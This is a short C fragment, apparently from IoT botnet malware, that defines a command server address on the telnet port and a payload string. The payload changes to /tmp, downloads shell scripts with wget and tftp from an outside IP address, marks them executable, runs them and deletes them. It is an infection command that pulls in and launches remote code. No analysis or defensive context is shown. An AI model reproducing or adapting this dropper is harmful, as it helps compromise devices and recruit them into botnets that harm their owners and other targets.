...
unsigned char *commServer[] = { "10.158.0.2:23" };

char *payload = "cd /tmp; wget http://147.135.248.108/bins.sh; chmod 777 *; sh bins.sh; tftp -g 147.135.248.108 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh";
